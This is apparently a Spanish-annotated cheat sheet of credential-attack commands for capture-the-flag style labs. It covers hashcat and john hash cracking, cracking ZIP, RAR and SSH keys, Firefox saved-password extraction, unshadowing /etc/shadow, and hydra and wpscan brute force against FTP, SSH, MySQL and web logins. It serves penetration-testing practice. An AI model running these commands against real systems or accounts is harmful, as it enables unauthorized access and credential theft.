# hashcat
hashcat --help
hashcat -m MODE -a 0 hashfile diccionario --username
hashcat -m MODE -a 0 hashfile diccionario
hashcat -a 3 -m 0 hash ?a?a?a?a # a3=fuerza bruta,m0=MD5,?a=cantidad de caracteres del hash
hashcat -a 0 -m 0 hash wordlist # a0=ataque de diccionario,m0=MD5
hashcat --examples-hashes | grep 'mode'
hashcat -m MODE -a 0 HASH diccionario --force -o FILE **a=fuerza bruta, o=archivo destino**
hashcat -m 3200 jonah_hash rock12L.txt --show 

#hashcat crack krb5asrep$23
hashcat -m 18200 -a 0 hash.txt Pass.txt

# crunch
crunch 4 4 caracteres -o wordlist # crea un diccionario de 4 chars
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o pass.txt -z bzip2 # crea un diccionario de 8 chars y compresion

# john
john --list=formats | grep -iF "md5"
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
john --format=whirlpool --wordlist=/usr/share/wordlists/rockyou.txt hash4.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
john --single --format=raw-md5 hash7.txt

# zip cracking
zip2john zipfile > outfile
john --wordlist=/usr/share/wordlists/rockyou.txt outfile
fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt FILE.zip

# rar cracking
rar2john rarfile > outfile
john --wordlist=/usr/share/wordlists/rockyou.txt outfile

# ssh keys cracking
ssh2john id_rsa_priv > outfile
john --wordlist=/usr/share/wordlists/rockyou.txt outfile

# mozilla master key cracking
usr/share/john/mozilla2john.py carlj/.mozilla/firefox/0ryxwn4c.default-release/key3.db > hash
python3 ../firefox_decrypt-1.0.0/firefox_decrypt.py .mozilla/firefox/ 

# linux password cracking
unshadow /etc/passwd /etc/shadow > hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash
 
# hydra login brute force
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.158.58 ftp
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.67.168 ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered" -f -V
hydra -l admin -P rock9L.txt localhost -s 8081 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -f -V
hydra -t 1 -l quinn -P /usr/share/wordlists/rockyou.txt -vV 10.10.215.65 -s 10021 ftp
hydra -L usernames.txt -P wordlists.txt IP mysql 

# wpscan 
wpscan --url URL -e ap --plugins-detection aggresive -o OUTFILE
wpscan --url URL --enumerate u
wpscan --url IP/blog --usernames admin --passwords rockyou.txt --max-threads 50

# diccionarios
awk 'length($0) == 10' rockyou.txt > rock-10L.txt # achicar el diccionario a 10 caracteres de largo
